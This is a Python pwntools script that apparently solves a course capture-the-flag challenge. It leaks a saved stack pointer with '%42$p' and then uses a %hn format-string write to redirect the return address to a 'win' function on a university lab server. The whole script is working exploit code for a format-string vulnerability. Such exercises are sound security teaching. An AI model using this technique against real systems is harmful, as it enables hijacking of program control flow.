from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25198

elf = ELF('./program/08_return')
win_addr = elf.symbols['win']

print(f"win address: {hex(win_addr)}")

#s = process('./program/08_return', shell=True)
s = remote(SERVER, PORT, timeout=9999)

# we need to leak position 42 (saved EBP) to calculate position 43 address
s.sendline(b"%42$p")
leak = s.recvline().decode(errors='ignore').strip()
saved_ebp = int(leak.replace("0x", ""), 16)
ret_addr = saved_ebp + 4
print(f"EBP: {hex(saved_ebp)}")
print(f"Return address: {hex(ret_addr)}")
s.close()

#s = process('./program/08_return', shell=True)
s = remote(SERVER, PORT, timeout=9999)

win_low = win_addr & 0xffff       # 0x91f6 = 37366
win_high = (win_addr >> 16) & 0xffff  # 0x0804 = 2052

payload = p32(ret_addr + 2) + p32(ret_addr) 
written = 8

padding1 = win_high - written
payload += "%{}x%7$hn".format(padding1).encode()
written = win_high

padding2 = (0x10000 + win_low - written) & 0xffff
payload += "%{}x%8$hn".format(padding2).encode()

#s = process('./program/08_return', shell=True)
s = remote(SERVER, PORT, timeout=9999)
s.sendline(payload) 
response = s.recvall(timeout=1).decode(errors='ignore')
s.close()
print(response)